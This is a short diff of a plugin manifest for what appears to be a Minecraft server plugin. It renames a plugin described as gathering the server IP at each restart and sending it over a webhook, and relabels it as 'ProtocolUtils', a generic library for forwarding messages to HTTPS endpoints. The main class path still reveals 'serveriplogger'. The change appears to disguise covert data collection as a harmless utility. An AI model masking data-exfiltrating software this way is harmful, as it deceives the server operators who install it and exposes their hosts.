@@ -1,9 +1,9 @@
-name: SwampLogger
+name: ProtocolUtils
 version: '${version}'
-main: dev.sweetierick.serveriplogger.SwampLogger
+main: dev.sweetierick.serveriplogger.ProtocolUtils
 api-version: 1.18
-prefix: SwpLogr
+prefix: ProtocolUtils
 authors: [ SweetieRick ]
-description: A simple logger that gathers the server IP at each restart and sends it over Webhook
+description: A simple lib to help forwarding messages to HTTPS endpoints
 depend:
   - RedLib
